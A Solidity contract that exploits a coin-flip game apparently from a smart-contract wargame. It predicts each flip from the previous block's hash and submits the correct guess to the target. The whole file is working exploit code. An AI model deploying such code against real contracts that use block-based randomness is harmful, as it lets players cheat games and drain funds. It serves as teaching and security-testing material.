pragma solidity ^0.8.0;

interface IMainContract {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipParityAttacker {
    address public instance_address;
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _instance) {
        instance_address = _instance;
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = (coinFlip & 1) == 1;
        IMainContract(instance_address).flip(side);
    }
}
